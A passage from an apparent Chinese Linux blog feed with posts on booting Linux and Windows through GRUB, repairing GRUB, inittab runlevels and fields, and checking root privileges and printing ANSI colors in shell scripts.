指令中的&#x2F;boot去掉，也就是&#x2F;vmlinuzMMMMMM 或 &#x2F;initrdNNNN</p><p>也可以不用root (hd[0-n]来指定&#x2F;boot所在分区，要在kernel 和initrd 中指定；比如Linux的&#x2F;根所位于的分区和&#x2F;boot所位于的分区都是(hd0,6)，并且我们cat出来的&#x2F;etc&#x2F;fstab是Linux的&#x2F;根分区的文件系统的标签为LABEL&#x3D;&#x2F;，引导操作系统的例子如下；</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">grub</span>&gt;kernel (hd0,<span class="hljs-number">6</span>)/boot/vmlinuz-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4 ro root=LABEL=/<br><span class="hljs-attribute">grub</span>&gt;initrd (hd0,<span class="hljs-number">6</span>)/boot/initrd-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4.img<br><span class="hljs-attribute">grub</span>&gt;boot<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">grub</span>&gt;kernel (hd0,<span class="hljs-number">6</span>)/boot/vmlinuz-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4 ro root=/dev/hda7<br><span class="hljs-attribute">grub</span>&gt;initrd (hd0,<span class="hljs-number">6</span>)/boot/initrd-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4.img<br><span class="hljs-attribute">grub</span>&gt;boot<br></code></pre></td></tr></table></figure><p>如果&#x2F;boot位于 &#x2F;dev&#x2F;hda6，也就是(hd0,5)，Linux的根&#x2F;位于分区&#x2F;dev&#x2F;hda7，并且我们cat 出来的&#x2F;etc&#x2F;fstab 中&#x2F;分区的标签为 LABEL&#x3D;&#x2F;。下面的两种方法都可以引导；</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">grub</span>&gt;kernel (hd0,<span class="hljs-number">5</span>)/vmlinuz-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4 ro root=LABEL=/<br><span class="hljs-attribute">grub</span>&gt;initrd (hd0,<span class="hljs-number">5</span>)/initrd-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4.img<br><span class="hljs-attribute">grub</span>&gt;boot<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">grub</span>&gt;kernel (hd0,<span class="hljs-number">5</span>)/vmlinuz-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4 ro root=/dev/hda7<br><span class="hljs-attribute">grub</span>&gt;initrd (hd0,<span class="hljs-number">5</span>)/initrd-<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">11</span>-<span class="hljs-number">1</span>.<span class="hljs-number">1369</span>_FC4.img<br><span class="hljs-attribute">grub</span>&gt;boot<br></code></pre></td></tr></table></figure><h1 id="六、通过GRUB引导Windows操作系统；"><a href="#六、通过GRUB引导Windows操作系统；" class="headerlink" title="六、通过GRUB引导Windows操作系统；"></a>六、通过GRUB引导Windows操作系统；</h1><h2 id="1、通过编辑-menu-lst-来引导Windows-系统；"><a href="#1、通过编辑-menu-lst-来引导Windows-系统；" class="headerlink" title="1、通过编辑 menu.lst 来引导Windows 系统；"></a>1、通过编辑 menu.lst 来引导Windows 系统；</h2><p>如果您的Windows所处于的分区在(hd0,0)，可以在menu.lst 加如下的一段就能引导起来了；</p><pre><code>title WinXp    rootnoverify (hd0,0)    chainloader +1</code></pre><p>如果您的机器有两块硬盘，而Windows 位于第二个硬盘的第一个分区，也就是(hd1,0)</p><p>您可以用grub的map来指令来操作把两块硬盘的序列对调，这样就不用在BIOS中设置了；在menu.lst中加如下的内容，比如下面的；</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lisp">title WinXp<br>        map (<span class="hljs-name">hd0</span>) (<span class="hljs-name">hd1</span>)<br>        map (<span class="hljs-name">hd1</span>) (<span class="hljs-name">hd0</span>)<br>        rootnoverify (<span class="hljs-name">hd0</span>,<span class="hljs-number">0</span>)<br>        chainloader <span class="hljs-number">+1</span><br>  makeactive<br></code></pre></td></tr></table></figure><p>如果Windows的分区不位于硬盘的第一个分区怎么办呢？比如在(hd0,2)；</p><p>这个也好办吧，把rootnoverify 这行的(hd0,0)改为 (hd0,2)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">title</span> WinXp<br>        <span class="hljs-attribute">rootnoverify</span> (hd0,<span class="hljs-number">2</span>)<br>        <span class="hljs-attribute">chainloader</span> +<span class="hljs-number">1</span><br>  <span class="hljs-attribute">makeactive</span><br></code></pre></td></tr></table></figure><p>如果Windows的在第二个硬盘的某个分区，比如说是位于(hd1,2)，则要用到map指令；</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lisp">title WinXp<br>        map (<span class="hljs-name">hd0</span>) (<span class="hljs-name">hd1</span>)<br>        map (<span class="hljs-name">hd1</span>) (<span class="hljs-name">hd0</span>)<br>        rootnoverify (<span class="hljs-name">hd1</span>,<span class="hljs-number">2</span>)<br>        chainloader <span class="hljs-number">+1</span><br>  makeactive<br></code></pre></td></tr></table></figure><p>如果有多个Windows 系统，怎么才能引导出来呢？应该用hide 和unhide指令操作；比如我们安装了两个Windows ，一个是位于(hd0,0)的windows 98 ，另一个是安装的是位于(hd0,1)的WindowsXP；这时我们就要用到hide指令了；</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">title</span> Win98<br>         <span class="hljs-attribute">unhide</span> (hd0,<span class="hljs-number">0</span>)<br>         <span class="hljs-attribute">hide</span> (hd0,<span class="hljs-number">1</span>)<br>        <span class="hljs-attribute">rootnoverify</span> (hd0,<span class="hljs-number">0</span>)<br>        <span class="hljs-attribute">chainloader</span> +<span class="hljs-number">1</span><br>  <span class="hljs-attribute">makeactive</span><br><br><span class="hljs-attribute">title</span> WinXP<br>        <span class="hljs-attribute">unhide</span> (hd0,<span class="hljs-number">1</span>)<br>        <span class="hljs-attribute">hide</span> (hd0,<span class="hljs-number">0</span>)<br>        <span class="hljs-attribute">rootnoverify</span> (hd0,<span class="hljs-number">1</span>)<br>        <span class="hljs-attribute">chainloader</span> +<span class="hljs-number">1</span><br>  <span class="hljs-attribute">makeactive</span><br></code></pre></td></tr></table></figure><h2 id="2、通过GRUB指令来引导Windows-；"><a href="#2、通过GRUB指令来引导Windows-；" class="headerlink" title="2、通过GRUB指令来引导Windows ；"></a>2、通过GRUB指令来引导Windows ；</h2><p>其实我们会写menu.lst了，在menu.lst中的除了title外，都是一条条指令；如果我们启动Windows ，只是输入指令就行了；</p><p>比如 Windows的分区在 (hd0,0)，我们在开机后，按ctrl+c ，进入GRUB的命令模式；就可以用下面的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">grub&gt; </span><span class="language-bash">rootnoverify (hd0,0)</span><br><span class="hljs-meta prompt_">grub&gt; </span><span class="language-bash">chainloader +1</span><br><span class="hljs-meta prompt_">grub&gt; </span><span class="language-bash">boot</span><br></code></pre></td></tr></table></figure><p>其它同理… …</p><h1 id="七、GRUB丢失或损坏的应对策略；"><a href="#七、GRUB丢失或损坏的应对策略；" class="headerlink" title="七、GRUB丢失或损坏的应对策略；"></a>七、GRUB丢失或损坏的应对策略；</h1><p>如果GRUB是Linux版本才出会这样的问题；WINGRUB可以不写在MBR上；所以不会出现这样的问题。WINGRUB用起来比较简单。menu.lst 和命令行的用法和Linux版本的GRUB是一样的；</p><h2 id="1、由于重新安装Windows或其它未知原因而导致GRUB的丢失；"><a href="#1、由于重新安装Windows或其它未知原因而导致GRUB的丢失；" class="headerlink" title="1、由于重新安装Windows或其它未知原因而导致GRUB的丢失；"></a>1、由于重新安装Windows或其它未知原因而导致GRUB的丢失；</h2><p>您可以通过系统安装盘、livecd进入修复模式；</p><p>请参考：《Linux 系统的单用户模式、修复模式、跨控制台登录在系统修复中的运用》</p><p>首先：您根据前面所说grub-install来安装GRUB到&#x2F;boot所在的分区；要仔细看文档，&#x2F;boot是不是处于一个独立的分区是重要的，执行的命令也不同；</p><p>其次：要执行grub ，然后通过 root (hd[0-n],y)来指定&#x2F;boot所位于的分区，然后接着执行 setup (hd0)，这样就写入MBR了，比如下面的例子；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">grub&gt;</span><span class="language-bash">root (hd0,6)</span><br><span class="hljs-meta prompt_">grub&gt;</span><span class="language-bash">setup (hd0)</span><br><span class="hljs-meta prompt_">grub&gt;</span><span class="language-bash">quit</span><br></code></pre></td></tr></table></figure><p>重新引导就会再次出现MBR的菜单了或命令行的提示符了；</p><h2 id="2、如果出现GRUB提示符，而不出现GRUB的菜单，如何引导系统；"><a href="#2、如果出现GRUB提示符，而不出现GRUB的菜单，如何引导系统；" class="headerlink" title="2、如果出现GRUB提示符，而不出现GRUB的菜单，如何引导系统；"></a>2、如果出现GRUB提示符，而不出现GRUB的菜单，如何引导系统；</h2><p>存在的问题可能是&#x2F;boot&#x2F;grub&#x2F;menu.lst丢失，要自己写一个才行；您可以用命令行来启动系统，进入系统后写一写menu.lst就OK了。前面已经谈过了；</p><p>写好后还要建一个grub.conf的链接，如下：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># cd /boot/grub</span><br>[root<span class="hljs-symbol">@localhost</span> grub]<span class="hljs-meta"># ln -s menu.lst grub.conf</span><br></code></pre></td></tr></table></figure><h1 id="八、关于GRUB的未尽事宜；"><a href="#八、关于GRUB的未尽事宜；" class="headerlink" title="八、关于GRUB的未尽事宜；"></a>八、关于GRUB的未尽事宜；</h1><p>GRUB有很多内容，比如对BSD的引导，还有一些其它指令的用法，我并没有在本文提到；主要我目前还未用到，如果您需要了解更多，请查看 《GNU GRUB 手册和FAQ》</p><h1 id="九、关于本文；"><a href="#九、关于本文；" class="headerlink" title="九、关于本文；"></a>九、关于本文；</h1><p>本文前后写了三四天，中间发现并不能把Linux设备的两种表现形式说的清楚，于是被迫写了《在Linux系统中存储设备的两种表示方法》；由于没有BSD系统，所以没有写关于BSD的引导；如果正在用BSD的弟兄如果有时间不妨写一写；写的时候注意文档的结构，这样方便大家的阅读；</p><p>GRUB有很多内容，需要大家慢慢的学习和研究；有的弟兄抑制GRUB，说不如NTLOADER，其实这是错误的；如果您想学习和使用Linux就得学习和适应Linux的操作；习惯成自然，如果您抵制学习Linux，那可能您永远会说“Linux不如Windows”；</p><h1 id="十、参考文档；"><a href="#十、参考文档；" class="headerlink" title="十、参考文档；"></a>十、参考文档；</h1><p>《GNU GRUB 手册和FAQ》</p><h1 id="注-以上文档为本人整理资料时发现的文章-但是文章的出处已经无从查证-对书写此文章的前辈致敬"><a href="#注-以上文档为本人整理资料时发现的文章-但是文章的出处已经无从查证-对书写此文章的前辈致敬" class="headerlink" title="注:以上文档为本人整理资料时发现的文章,但是文章的出处已经无从查证,对书写此文章的前辈致敬"></a>注:以上文档为本人整理资料时发现的文章,但是文章的出处已经无从查证,对书写此文章的前辈致敬</h1>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Grub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>init进程</title>
    <link href="/2018/05/15/2018-05-15-linux-init/"/>
    <url>/2018/05/15/2018-05-15-linux-init/</url>
    
    <content type="html"><![CDATA[<h1 id="init进程"><a href="#init进程" class="headerlink" title="init进程"></a>init进程</h1><p>init的进程号为1,是所有进程的父进程，内核初始化完毕之后，init程序开始运行。其他软件也同时开始运行。init程序通过&#x2F;etc&#x2F;inittab文件进行配置。inittab文件的内容如下：<br>引用内容：</p><pre><code># inittab       This file describes how the INIT process should set up#               the system in a certain run-level.## Author:       Miquel van Smoorenburg, &lt;miquels@drinkel.nl.mugnet.org&gt;#               Modified for RHS Linux by Marc Ewing and Donnie Barnes#                                                                                                                         # Default runlevel. The runlevels used by RHS are:#   0 - halt (Do NOT set initdefault to this)#   1 - Single user mode#   2 - Multiuser, without NFS (The same as 3, if you do not have networking)#   3 - Full multiuser mode#   4 - unused#   5 - X11#   6 - reboot (Do NOT set initdefault to this)#    id:3:initdefault:                                                                                                                         # System initialization.si::sysinit:/etc/rc.d/rc.sysinit                                                                                                                         l0:0:wait:/etc/rc.d/rc 0l1:1:wait:/etc/rc.d/rc 1l2:2:wait:/etc/rc.d/rc 2l3:3:wait:/etc/rc.d/rc 3l4:4:wait:/etc/rc.d/rc 4l5:5:wait:/etc/rc.d/rc 5l6:6:wait:/etc/rc.d/rc 6# Things to run in every runlevelud::once:/sbin/update                                                                                                                         # Trap CTRL-ALT-DELETEca::ctrlaltdel:/sbin/shutdown -t3 -r now                                                                                                                         # When our UPS tells us power has failed, assume we have a few minutes# of power left.  Schedule a shutdown for 2 minutes from now.# This does, of course, assume you have powerd installed and your# UPS connected and working correctly.pf::powerfail:/sbin/shutdown -f -h +2 &quot;Power Failure; System Shutting Down&quot;                                                                                                                         # If power was restored before the shutdown kicked in, cancel it.pr:12345:powerokwait:/sbin/shutdown -c &quot;Power Restored; Shutdown Cancelled&quot;# If power was restored before the shutdown kicked in, cancel it.pr:12345:powerokwait:/sbin/shutdown -c &quot;Power Restored; Shutdown Cancelled&quot;                                                                                                                                                                                                                                                  # Run gettys in standard runlevels1:2345:respawn:/sbin/mingetty tty12:2345:respawn:/sbin/mingetty tty23:2345:respawn:/sbin/mingetty tty34:2345:respawn:/sbin/mingetty tty45:2345:respawn:/sbin/mingetty tty56:2345:respawn:/sbin/mingetty tty6                                                                                                                             # Run xdm in runlevel 5x:5:respawn:/etc/X11/prefdm -nodaemon</code></pre><p>Runlevel 0是让init关闭所有进程并终止系统。</p><p>Runlevel 1是用来将系统转到单用户模式，单用户模式只能有系统管理员进入，在该模式下处理那些在有登录用户的情况下不能进行更改的文件，改runlevel的编号1也可以用S代替。</p><p>Runlevel 2是允许系统进入多用户的模式，但并不支持文件共享，这种模式很少应用。</p><p>Runlevel 3是最常用的运行模式，主要用来提供真正的多用户模式，也是多数服务器的缺省模式。</p><p>Runlevel 4一般不被系统使用，用户可以设计自己的系统状态并将其应用到runlevel 4阶段，尽管很少使用，但使用该系统可以实现一些特定的登录请求。</p><p>Runlevel 5是将系统初始化为专用的X Window终端。对功能强大的Linux系统来说，这并不是好的选择，但用户如果需要这样，也可以通过在runlevel启动来实现该方案。</p><p>Runlevel 6是关闭所有运行的进程并重新启动系统。</p><p>在inittab文件中以#开头的所有行都是注释行。注释行有助于用户理解inittab文件，inittab文件中的值都是如下格式：</p><pre><code>label:runlevel:action:process</code></pre><p>label是1~4个字符的标签，用来标示输入的值。一些系统只支持2个字符的标签。鉴于此原因，多数人都将标签字符的个数限制在2个以内。该标签可以是任意字符构成的字符串，但实际上，某些特定的标签是常用的，在Red Hat Linux中使用的标签是：<br>代码:</p><pre><code>id 用来定义缺省的init运行的级别si 是系统初始化的进程ln 其中的n从1~6,指明该进程可以使用的runlevel的级别ud 是升级进程ca 指明当按下Ctrl+Alt+Del是运行的进程pf 指当UPS表明断电时运行的进程pr 是在系统真正关闭之前，UPS发出电源恢复的信号时需要运行的进程x  是将系统转入X终端时需要运行的进程</code></pre><p>runlevel字段指定runlevel的级别。可以指定多个runlevel级别，也可以不为runlevel字段指定特定的值。</p><p>action字段定义了该进程应该运行在何种状态下：<br>代码:</p><pre><code>boot        在系统启动时运行，忽略runlevelbootwait    在系统启动时运行，init等待进程完成。忽略runlevelctrlaltdel    当Ctrl+Alt+Del三个键同时按下时运行，把SIGINT信号发送给init。忽略    runlevelinitdefault    不要执行这个进程，它用于设置默认runlevelkbrequest    当init从键盘中收到信号时运行。这里要求键盘组合符合KeyBoardSigral(参见/usr/share/doc/kbd-*关于键盘组合的文档)off        禁止进入，因此该进程不运行once        每一个runlevel级别运行一次ondemand    当系统指定特定的运行级别A、B、C时运行powerfail    当init收到SIGPWR信号时运行powerokwait    当收到SIGPWD信号且/etc/文件中的电源状态包含OK时运行powerwait    当收到SIGPWD信号，并且init等待进程结束时运行respawn        不管何时终止都重新启动进程sysinit        在运行boot或bootwait进程之前运行wait        运行进程等待输入运行模式process 字段包含init执行的进程，该进程采用的格式与在命令行下运行该进程的格式一样，因此process字段都以该进程的名字开头，紧跟着是运行时，紧跟着是运行时要传递给该进程的参数。比如/sbin/shutdown -t3 -r now，该进程在按下Ctrl+Alt+Del时执行，在命令行下也可以直接输入来重新启动系统。</code></pre><p>特殊目的的记录<br>    仔细学习例子文件，学习应用其中关于inittab的语法格式。该文件的大多数内容都可以忽略，因为超过一半的内容都是注释，剩余的一些文件内容主要是用来实现某些特殊的功能：</p><pre><code>id 的值表明缺省的runlevel是3。ud 的值可以唤醒/sbin/update进程，该进程为保持磁盘的完整性，将在对磁盘进行I/O操作之前清空整个I/O缓冲区。pf、pr和ca的值只被特定的中断所调用。</code></pre><p>如果系统是专用的X终端，则只需x的输入值。<br>getty进程来提供虚拟终端设备的服务，例如：</p><pre><code>3:2345:respawn:/sbin/mingetty tty3</code></pre><p>标签字段的值是3,3是设备tty3的数字后缀,tty3与相应的进程相关联，该getty进程可以启动的runlevel是2、3、4和5,当该进程终止时，init马上就重新启动它。启动进程的路径名是&#x2F;sbin&#x2F;mingetty，该进程是实现虚拟终端支持的最小版本的getty，为tty3提供启动虚拟设备的进程。</p><pre><code>si::sysinit:/etc/rc.d/rc.sysinit</code></pre><p>该值告诉init程序运行&#x2F;etc &#x2F;rc.d&#x2F;rc.sysinit脚本文件来初始化系统，该脚本文件与所有启动的脚本类似，它只是一个包含Linux的 shell命令的可执行文件，注意输入的字符串必须包括该脚本的完整路径。不同版本的Linux存放该脚本的位置也不相同，但不用刻意去记忆这些位置，只需查看&#x2F;etc&#x2F;inittab 文件即可，该文件中包含启动脚本文件的确切位置。</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shell编程技巧之判断用户权限</title>
    <link href="/2018/05/14/2018-05-14-judge-root-in-shell/"/>
    <url>/2018/05/14/2018-05-14-judge-root-in-shell/</url>
    
    <content type="html"><![CDATA[<h1 id="shell编程技巧之判断用户权限"><a href="#shell编程技巧之判断用户权限" class="headerlink" title="shell编程技巧之判断用户权限"></a>shell编程技巧之判断用户权限</h1><hr><h2 id="UID-GID-EUID-EGID-SUID-SGID"><a href="#UID-GID-EUID-EGID-SUID-SGID" class="headerlink" title="UID,GID,EUID,EGID,SUID,SGID"></a>UID,GID,EUID,EGID,SUID,SGID</h2><table><thead><tr><th align="center">名称</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">UID&#x2F;GID</td><td align="center">实际用户ID和实际用户组ID,登录时用户对应的ID</td></tr><tr><td align="center">EUDI&#x2F;EGID</td><td align="center">有效的用户ID和有效的组ID,主要指定了访问目标的权限</td></tr><tr><td align="center">SUID&#x2F;SGID</td><td align="center">针对文件而讲述的概念,他可以修改当前进程的EUDI&#x2F;EGID</td></tr></tbody></table><h2 id="linux权限s-x2F-t"><a href="#linux权限s-x2F-t" class="headerlink" title="linux权限s&#x2F;t"></a>linux权限s&#x2F;t</h2><p>这里s&#x2F;t是针对执行权限来说的.<br>s权限,是为了让使用者临时具有该文件的所属用户或组的执行权限,0755最前面的0表示不使用任何特殊<br>权限，该位上的数字可以是<code>0,1(--t),2(-s-),3(-st),4(s--),5(s-t),6(ss-),7(sst)</code>,那个t权限只针对<br>目录生效，它表示只能让所属主以及root可以删除（重命名&#x2F;移动）该目录下的文件。比如&#x2F;tmp目录本<br>来就是任何用户都可以读写，如果别人可以任意删除（重命名&#x2F;移动）自己的文件，那岂不是很危险。<br>所以这个t权限就是为了解决这个麻烦的。</p><h2 id="判断当前有效用户的权限是否为root"><a href="#判断当前有效用户的权限是否为root" class="headerlink" title="判断当前有效用户的权限是否为root"></a>判断当前有效用户的权限是否为root</h2><pre><code>[[ $EUID -ne 0 ]] &amp;&amp; echo -e &quot;[Error] This script must be run as root!&quot; &amp;&amp; exit 1</code></pre><p>可以使用ANSI转义代码图形再现序列(SGR sequence)输出彩色警示文字</p><pre><code># Colorred=&#39;\033[0;31m&#39;green=&#39;\033[0;32m&#39;yellow=&#39;\033[0;33m&#39;plain=&#39;\033[0m&#39;# Make sure only root can run our script[[ $EUID -ne 0 ]] &amp;&amp; echo -e &quot;[$&#123;red&#125;Error$&#123;plain&#125;] This script must be run as root!&quot; &amp;&amp; exit 1</code></pre><h2 id="附ANSI转义代码图形再现序列-SGR-sequence"><a href="#附ANSI转义代码图形再现序列-SGR-sequence" class="headerlink" title="附ANSI转义代码图形再现序列(SGR sequence)"></a>附ANSI转义代码图形再现序列(SGR sequence)</h2><h3 id="ANSI-escape-sequences-CSI"><a href="#ANSI-escape-sequences-CSI" class="headerlink" title="ANSI escape sequences - CSI"></a>ANSI escape sequences - CSI</h3><figure class="highlight plaintext"><figcaption><span>Sequence Introducer```, CSI是ANSI转义序列中最有用处的序列，用两字符序列```ESC [```表示，</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs Control">这个序列是由```控制字符ESC```（通常用```^[```或```&lt;ESC&gt;```表示），加上后面的左方括号字符```[```组<br>成，即```^[[```。因为大多数文本编辑器将键盘上的ESC键解释为其它功能，所以不能仅敲击ESC键，比如在<br>xterm终端中要输出^[这个字符，你需要先按Ctrl + v，然后按ESC键<br><br>在bash中，控制字符ESC也支持```\e、\033或\x1b```三种转义字符的写法，大写字母也行<br><br>### 设置显示属性 - SGR<br>要控制显示格式，必须使用```Set Graphic Rendition```, SGR转义序列```ESC [ parameters m```，其中```m```<br>表示这是SGR序列，```parameters```是控制代码，可以有多个代码组合，中间用分号```;```隔开，如果不指定<br>代码```ESC [ m```相当于```ESC [ 0 m```（重置所有显示控制属性为默认设置）。<br><br>显示控制代码有3类：<br><br>    * 效果控制代码<br>    * 前景色控制代码（即字体颜色）<br>    * 背景色控制代码<br><br>#### 效果控制代码<br><br>| 代码 | 效果 | 备注 |<br>| :------: | :------: | :------: |<br>| 0 | 重置所有显示属性为默认设置 | reset all attributes to their defaults |<br>| 1 | 字体加粗 | set bold |<br>| 4 | 字体加下划线 | set underscore |<br>| 5 | 字体闪烁 | set blink |<br>| 7 | 前景色与背景色调转 | set reverse video |<br><br>#### 字体颜色和背景颜色控制代码<br>前景色控制代码和背景色控制代码都使用两位数表示，前景色使用3开头，而背景色使用4开头，第二位数字表示具体颜色 &lt;br /&gt;<br>字体颜色：30:黑 31:红 32:绿 33:黄 34:蓝色 35:紫色 36:深绿 37:白色 &lt;br /&gt; <br>背景：40:黑 41:深红 42:绿 43:黄色 44:蓝色 45:紫色 46:深绿 47:白色。&lt;br /&gt;<br>因此，要设置红色前景则发送代码```ESC [31m```，要设置黄色背景可以使用代码```ESC [43m```；也可以组合使用，比如要<br>设置字体颜色为红色、背景为黄色、且字体加粗，则使用代码```ESC [31;43;1m```.<br><br>### bash修改字符颜色<br>想在bash命令行或脚本中使用带颜色的字符，可以使用echo命令，像发送普通文本一样，将ANSI转义字符序列发送到终端会话：<br></code></pre></td></tr></table></figure><ol><li>使用<code>^[</code>这个字符，你需要先按<code>Ctrl + v</code>，然后按<code>ESC</code>键（你不能直接复制我的哦~）</li></ol><h1 id="echo-31m红色字体"><a href="#echo-31m红色字体" class="headerlink" title="echo ^[[31m红色字体"></a>echo ^[[31m红色字体</h1><ol start="2"><li>使用bash的ESC转义控制字符，注意echo要使用-e选项，且后面的字符要用引号包括起来，单引号或双引号都可以</li></ol><h1 id="echo-e-“-e-31m红色字体”"><a href="#echo-e-“-e-31m红色字体”" class="headerlink" title="echo -e “\e[31m红色字体”"></a>echo -e “\e[31m红色字体”</h1><h1 id="echo-e-“-033-31m红色字体”"><a href="#echo-e-“-033-31m红色字体”" class="headerlink" title="echo -e “\033[31m红色字体”"></a>echo -e “\033[31m红色字体”</h1><h1 id="echo-e-“-x1b-31m红色字体”"><a href="#echo-e-“-x1b-31m红色字体”" class="headerlink" title="echo -e “\x1b[31m红色字体”"></a>echo -e “\x1b[31m红色字体”</h1><h1 id="echo-e-“-E-31m红色字体”-大写字母"><a href="#echo-e-“-E-31m红色字体”-大写字母" class="headerlink" title="echo -e “\E[31m红色字体”  # 大写字母"></a>echo -e “\E[31m红色字体”  # 大写字母</h1><h1 id="echo-e-“-x1B-31m红色字体”"><a href="#echo-e-“-x1B-31m红色字体”" class="headerlink" title="echo -e “\x1B[31m红色字体”"></a>echo -e “\x1B[31m红色字体”</h1><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">上述代码都可以显示红色字体，但是你会注意到在<span class="hljs-keyword">shell</span><span class="language-bash">打印出<span class="hljs-built_in">echo</span>命令中的文本之后，新的提示符仍然使用该颜色效果，需要</span><br>使用重置控制码<span class="hljs-number">0</span>（即ESC [<span class="hljs-number">0</span>m，）将终端重置为正常显示：<br></code></pre></td></tr></table></figure><h1 id="echo-31m红色字体-0m"><a href="#echo-31m红色字体-0m" class="headerlink" title="echo ^[[31m红色字体^[[0m"></a>echo ^[[31m红色字体^[[0m</h1><h1 id="echo-e-“-e-31m红色字体-e-0m”"><a href="#echo-e-“-e-31m红色字体-e-0m”" class="headerlink" title="echo -e “\e[31m红色字体\e[0m”"></a>echo -e “\e[31m红色字体\e[0m”</h1><h1 id="echo-e-“-033-31m红色字体-033-0m”"><a href="#echo-e-“-033-31m红色字体-033-0m”" class="headerlink" title="echo -e “\033[31m红色字体\033[0m”"></a>echo -e “\033[31m红色字体\033[0m”</h1><h1 id="echo-e-“-x1b-31m红色字体-x1b-0m”"><a href="#echo-e-“-x1b-31m红色字体-x1b-0m”" class="headerlink" title="echo -e “\x1b[31m红色字体\x1b[0m”"></a>echo -e “\x1b[31m红色字体\x1b[0m”</h1><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">同时设置多个控制代码，用<span class="hljs-comment">;隔开，顺序无关：</span><br></code></pre></td></tr></table></figure><h1 id="echo-e-“-e-31-42-1m绿底红字加粗-e-0m”"><a href="#echo-e-“-e-31-42-1m绿底红字加粗-e-0m”" class="headerlink" title="echo -e “\e[31;42;1m绿底红字加粗\e[0m”"></a>echo -e “\e[31;42;1m绿底红字加粗\e[0m”</h1><h1 id="echo-e-“-e-1-42-31m绿底红字加粗-e-0m”"><a href="#echo-e-“-e-1-42-31m绿底红字加粗-e-0m”" class="headerlink" title="echo -e 